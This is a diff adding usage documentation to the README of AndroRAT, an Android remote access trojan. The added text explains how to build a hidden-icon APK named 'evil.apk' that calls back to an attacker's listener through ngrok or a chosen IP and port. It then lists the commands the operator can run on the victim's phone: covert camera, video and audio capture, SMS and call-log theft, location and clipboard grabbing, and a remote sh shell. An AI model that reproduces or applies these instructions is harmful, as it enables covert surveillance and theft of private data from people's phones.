@@ -63,5 +63,57 @@ Usage:
     -o, --output            Name for the apk file (optional)
     -icon, --icon           Visible icon after installing apk (by default set to hidden)
 ```
-Or you can manually build the apk by importing [Android code](https://github.com/karma9874/AndroRAT/commit/73c953d72cc3ab1f4863f667425d53089cb8bacf) folder to Android Studio and changing the IP address and port number in config.java
+Or you can manually build the apk by importing [Android code](https://github.com/karma9874/AndroRAT/commit/73c953d72cc3ab1f4863f667425d53089cb8bacf) folder to Android Studio and changing the IP address and port number in [config.java](https://github.com/Magma69-cyber/AndroRAT/commit/d140db34c83da4de85a951c0afd5e3c3d65d418d)file  and then you can generate the signed apk from ```Android -> Build -> Generate signed APK(s) ```
+```shell ``` mode
+```
+Usage:
+  python3 androRAT.py --shell [flags]
+  Flags:
+    -i, --ip                Listner IP address
+    -p, --port              Listner port number
+```
+After running the ```shell `` mode you will get an interpreter of the device 
+Commands which can run on the interpreter 
+```
+    deviceInfo                 --> returns basic info of the device
+    camList                    --> returns cameraID  
+    takepic [cameraID]         --> Takes picture from camera
+    startVideo [cameraID]      --> starts recording the video
+    stopVideo                  --> stop recording the video and return the video file
+    startAudio                 --> starts recording the audio
+    stopAudio                  --> stop recording the audio
+    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
+    getCallLogs                --> returns call logs in a file
+    shell                      --> starts a sh shell of the device
+    vibrate [number_of_times]  --> vibrate the device number of time
+    getLocation                --> return the current location of the device
+    getIP                      --> returns the ip of the device
+    getSimDetails              --> returns the details of all sim of the device
+    clear                      --> clears the screen
+    getClipData                --> return the current saved text from the clipboard
+    getMACAddress              --> returns the mac address of the device
+    exit                       --> exit the interpreter
+```
+## Example 
+- To build the apk using ngrok which will also set the listner:
+  ``` python3 androRAT.py --build --ngrok -o evil.apk ```
+-To build the apk using desired ip and port: ```python3 androRAT.py --build -i 192.169.x.x -p 8080 -o evil.apk ```
+- To get the interpreter: ```python3 adnroRAT.py --shell -i 0.0.0.0 -p 8000 ```
+## Interperter Examples 
+- Generated APK
+  ![image](https://github.com/user-attachments/assets/2f9b23d4-0c56-46b2-b7eb-b7ce1000aec2)
+---------------------------------------------------------------------
+- Some interpreter Commands
+![image](https://github.com/user-attachments/assets/c073194e-0245-42ce-88e0-d1455a49037d)
+--------------------------------------------------------------------
+## Supporters:
+![image](https://github.com/user-attachments/assets/dbf499ff-a140-43de-b02d-21a7babc2b2d)
+
+## TODO
+- Ngrok support
+- Set up multi client
+- Add screenshot command
+## License
+AndroRAT is licensed under MIT license take a look at the [LICENSE]()
+for more information.
 
